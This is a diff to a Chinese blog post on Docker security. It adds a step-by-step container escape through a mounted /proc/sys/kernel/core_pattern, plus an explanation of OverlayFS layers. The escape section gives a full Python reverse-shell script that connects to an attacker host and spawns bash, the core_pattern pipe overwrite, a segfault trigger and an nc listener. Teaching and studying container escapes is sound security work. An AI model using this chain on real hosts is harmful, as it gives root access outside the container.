@@ -133,9 +133,177 @@ Docker 有三大核心机制：
 
 User Namespace 是 Linux 内核提供的一种隔离机制，可以将容器内的用户 ID 映射到宿主机的用户 ID，从而实现用户层面的隔离。
 但是，这个 User Namespace **不是默认开启的**，需要在 Docker 的配置文件中进行设置。
-也就是说，默认情况下，Docker 里的 root 跟宿主机的 root 就是一回事，被面试官忽悠了，绷。
+也就是说，**默认情况下，Docker 里的 root 跟宿主机的 root 就是一回事**，被面试官忽悠了，绷。
 
 ## Docker 逃逸
+
+### 特权模式
+
+### 挂载 Docker Socket
+
+### 挂载 procfs
+
+创建一个容器并挂载 `/proc` 目录
+
+```bash
+docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
+```
+
+看看有没有两个 `core_pattern` 文件
+
+```bash
+find / -name core_pattern
+/proc/sys/kernel/core_pattern
+/host/proc/sys/kernel/core_pattern
+```
+
+找到当前容器在宿主机下的绝对路径
+
+```bash
+cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
+workdir=/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/work
+```
+
+这里说一下 `xargs` 命令，`-d` 选项指定分隔符，`-n` 选项指定每次传递给命令的参数个数。
+如此其实也可以用如下命令只输出目录
+
+```bash
+cat /proc/mounts | xargs -d ',' -n 1 | grep workdir | xargs -d "=" | awk '{print $2}'
+```
+
+意思就是当前容器挂载在宿主机的 `/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/merged` 目录下，去宿主机 `ls` 一下也可以确认
+
+然后找个位置写一个反弹 shell 的脚本，我这里选择写在 `/tmp/t.py`
+
+```python
+#!/usr/bin/python3
+import os
+import pty
+import socket
+lhost = "<your_host_ip>"
+lport = <your_host_port>
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((lhost, lport))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    os.putenv("HISTFILE", '/dev/null')
+    pty.spawn("/bin/bash")
+    s.close()
+if __name__ == "__main__":
+    main()
+```
+
+加上执行权限（别忘了！！！）
+
+```bash
+chmod +x /tmp/t.py
+```
+
+写到宿主机的 `/proc` 目录下
+
+```bash
+echo -e "|/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/merged/tmp/t.py \rcore    " >  /host/proc/sys/kernel/core_pattern
+```
+
+写一个可以触发 core dump 的程序
+
+```c
+#include<stdio.h>
+int main(void)  {
+   int *a  = NULL;
+   *a = 1;
+   return 0;
+}
+```
+
+编译一下，执行
+
+```bash
+gcc t.c -o t
+./t
+```
+
+记得在攻击机上开启监听
+
+```bash
+nc -lvnp <your_host_port>
+```
+
+shell 就弹出来了。
+
+#### 拓展之 OverlayFS
+
+我们知道 Docker 三大核心机制之一是 UnionFS，Docker 采用的是 OverlayFS。
+先说 UnionFS，其核心思想就是分层叠加，类似“多层透明纸叠加”的效果，每张纸画不同的内容，叠加在一起就形成了一个完整的图像。
+OverlayFS 则是 Linux 内核提供的一种 **UnionFS 的具体实现**。
+OverlayFS 需要四个目录：
+
+1. **lowerdir（下层目录）**：只读的基础层（如 Docker 镜像）。
+2. **upperdir（上层目录）**：可写层，存放修改后的文件。
+3. **merged（合并目录）**：最终用户看到的统一视图，合并了上下层内容。
+4. **workdir（工作目录）**：系统内部用于处理文件操作（如临时存放复制的文件）。
+
+**读取**文件时，若文件在 `upperdir` 中存在，则读取 `upperdir` 中的文件；否则读取 `lowerdir` 中的文件。
+**修改** `lowerdir` 中的文件时，会触发写时复制（Copy-on-Write）机制，将文件复制到 `upperdir` 中进行修改，原文件保持不变
+**删除**文件时，会在 `upperdir` 中标记一个“删除白板”，隐藏下层文件。
+最终效果：通过 `merged` 目录，用户可以看到一个合并后的完整的文件系统视图，原始基础镜像（lowerdir）始终不变。
+
+可以概括出如下优点：
+
+- **高效**：无需复制整个基础层，只有修改时才复制单个文件。
+- **节省空间**：多个容器可以共享同一基础层，避免重复存储。
+- **快速启动**：创建新容器时，只需创建新的 `upperdir` 和 `workdir`，而不需要复制整个文件系统。
+
+现在我们可以瞄一眼文件系统中的实际结构：
+
+```bash
+ls /var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49
+diff link lower merged work
+```
+
+`diff` 是一个目录，对应 `upperdir`，`ls` 一下可以看到里面是一个不完整的容器的根目录，只包含我们修改过的文件。
+`link` 是一个文件，存储该层的“短名称”（缩短的哈希值），用于简化目录引用，先不管他。
+
+```bash
+cat link
+WKXKCJ67B3V6VZNJ7GP4REARER
+```
+
+`lower` 是一个文件，对应 `lowerdir`，记录该层的下层目录的哈希值，也待会再说
+
+```bash
+cat lower
+l/5MMEIBNIEE5KXKNNZLRXW6U2YA:l/JVXDIO6M3RVT6N6O2ETGZQ5IY4
+```
+
+`merged` 是一个目录，即最终的合并视图，`ls` 看到的东西跟在容器里 `ls /`是一样的。
+`work` 是一个目录，作为处理文件操作的临时工作区，在复制、删除或修改时，系统在这里完成原子操作，确保数据一致性，由 OverlayFS 自动管理。
+
+现在我们再看一下那几个短哈希值
+
+```bash
+ls /var/lib/docker/overlay2/l -al
+lrwxrwxrwx  1 root root   77  4月 10 21:58 5MMEIBNIEE5KXKNNZLRXW6U2YA -> ../0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49-init/diff
+lrwxrwxrwx  1 root root   72  4月 10 21:58 WKXKCJ67B3V6VZNJ7GP4REARER -> ../0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/diff
+lrwxrwxrwx  1 root root   72  3月 20 15:05 JVXDIO6M3RVT6N6O2ETGZQ5IY4 -> ../78e27d8316131fb2b18adb91fd994cbe73436ed1685123f9e38ab7d36c4b7f52/diff
+```
+
+可以看到 `WKXKCJ67B3V6VZNJ7GP4REARER` 作为当前层，里面是有我们在容器里创建的文件的，`5MMEIBNIEE5KXKNNZLRXW6U2YA` 与 `JVXDIO6M3RVT6N6O2ETGZQ5IY4` 属于基础镜像层或者装 Python 之类的依赖后的层，里面的文件就比较朴素。
+
+最终视图可以理解成这样
+
+```plain
+容器视图（merged）
+├── 可写层（diff）     ← 容器运行时修改的文件
+├── 层2（Python 安装）  ← l/JVXDIO6M3RVT6N6O2ETGZQ5IY4
+└── 层1（Ubuntu 系统）  ← l/5MMEIBNIEE5KXKNNZLRXW6U2YA
+```
+
+### 挂载宿主机根目录
+
+### Docker remote api 未授权访问
 
 ## 如何设计一个安全的容器方案
 
@@ -181,4 +349,5 @@ User Namespace 是 Linux 内核提供的一种隔离机制，可以将容器内�
 
 ## 参考
 
-<https://docs.docker.com/engine/security/userns-remap/#about-remapping-and-subordinate-user-and-group-ids>
+[Isolate containers with a user namespace](https://docs.docker.com/engine/security/userns-remap/#about-remapping-and-subordinate-user-and-group-ids)
+[Docker 魔法解密：探索 UnionFS 与 OverlayFS](https://zhuanlan.zhihu.com/p/679328995)
